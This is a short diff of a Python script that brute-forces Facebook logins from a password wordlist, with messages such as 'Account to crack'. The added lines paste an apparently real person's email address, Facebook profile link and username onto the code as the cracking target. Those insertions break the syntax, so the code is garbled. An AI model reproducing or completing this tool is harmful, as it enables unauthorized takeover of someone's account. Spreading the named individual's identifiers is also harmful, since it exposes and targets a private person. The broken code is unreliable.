@@ -41,7 +41,7 @@ def welcome(email, passwordlist):
         print(wel)
         print(f" [*] Account to crack : {email}")Stacey0421@yahoo.com 
         print(f" [*] Loaded : {len(total)} passwords")
-        print(" [*] Cracking, please wait ...\n\n")
+        print(" [*] Cracking, please wait ...\n\n")/http://facebook.com/stacey.canington 
     except FileNotFoundError:
         print(f"[!] Error: Wordlist file '{passwordlist}' not found.")
         sys.exit()
@@ -79,8 +79,8 @@ def search(email, passwordlist, br):
         sys.exit()
 
 def main():
-    email = input("Enter the Facebook Username/Email/Phone: ")
-    passwordlist = input("Enter the wordlist name and path: ")
+    email = input("Enter the Facebook Username/Email/Phone: ")@stacey.canington 
+    passwordlist = input("Enter the wordlist name and path: ")stacey.canington 
 
     br = mechanize.Browser()
     cj = cookielib.LWPCookieJar()
